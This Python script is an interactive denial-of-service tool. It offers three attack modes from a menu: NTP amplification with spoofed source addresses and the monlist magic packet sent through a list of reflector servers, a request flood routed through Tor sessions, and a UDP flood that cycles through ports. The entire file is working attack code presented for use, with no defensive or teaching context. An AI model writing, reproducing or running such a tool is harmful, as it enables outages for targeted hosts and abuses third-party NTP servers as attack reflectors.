#!/usr/bin/env python

# Libraries
import sys
import os
import time
import socket
import random
import threading
import datetime
from scapy.all import *
from lib.tor import Tor  # Required from the second script
from lib.color import color  # Required from the second script
from lib.args import *  # Required for argument parsing in the second script

# Global Variables for NTP Amp
currentserver = 0
ntplist = []
data = "\x17\x00\x03\x2a" + "\x00" * 4  # Magic packet for NTP amplification

# UDP Flood Preparation
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Function: NTP Amplification Attack
def ntp_amplification(target, ntpserverfile, numberthreads):
    global ntplist, currentserver, data
    with open(ntpserverfile) as f:
        ntplist = f.readlines()
    if numberthreads > len(ntplist):
        print("Attack Aborted: More threads than servers")
        sys.exit(0)
    def deny():
        global ntplist, currentserver, data, target
        ntpserver = ntplist[currentserver].strip()
        currentserver += 1
        packet = IP(dst=ntpserver, src=target) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=data)
        send(packet, loop=1)
    threads = []
    for _ in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    print("NTP Amplification Attack Started. Press CTRL+C to stop.")
    while True:
        time.sleep(1)

# Function: Tor-based DDoS Attack
def tor_ddos(target, max_attempts):
    counter = 0
    try:
        while counter < max_attempts:
            tor = Tor()
            if not tor.tor_installed():
                print(f"{color.RED}[!] Tor is not installed. Exiting...{color.END}")
                sys.exit(1)
            start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
            counter += 1
            session = tor.new_session()
            print(f"{color.BLUE}[!] New Tor session initialized...{color.END}")
            print(f"{color.PURPLE}[+] Target: {target}{color.END}")
            print(f"{color.ORANGE}[*] Attacking {target}...{color.END}")
            session.get(target)
            print(f"{color.ORANGE}[*] Target {target} was attacked successfully{color.END}")
    except KeyboardInterrupt:
        pass
    finally:
        print(f"{color.RED}[!] Stopping Tor...{color.END}")
        tor.stop_tor()
        sys.exit(0)

# Function: UDP Flood Attack
def udp_flood(ip, port):
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1

# Main Execution
if __name__ == "__main__":
    # Menu
    os.system("clear")
    os.system("figlet Multi-Mode Attack")
    print("Select Attack Type:")
    print("1. NTP Amplification Attack")
    print("2. Tor-based DDoS Attack")
    print("3. UDP Flood Attack")
    choice = input("Enter choice [1-3]: ")

    # Execution based on choice
    if choice == "1":
        target = input("Enter Target IP: ")
        ntpserverfile = input("Enter NTP Server List File: ")
        numberthreads = int(input("Enter Number of Threads: "))
        ntp_amplification(target, ntpserverfile, numberthreads)
    elif choice == "2":
        args = parser.parse_args()
        target = args.target
        max_attempts = args.max_attempts
        tor_ddos(target, max_attempts)
    elif choice == "3":
        ip = input("Enter Target IP: ")
        port = int(input("Enter Target Port: "))
        udp_flood(ip, port)
    else:
        print("Invalid choice. Exiting...")
        sys.exit(1)
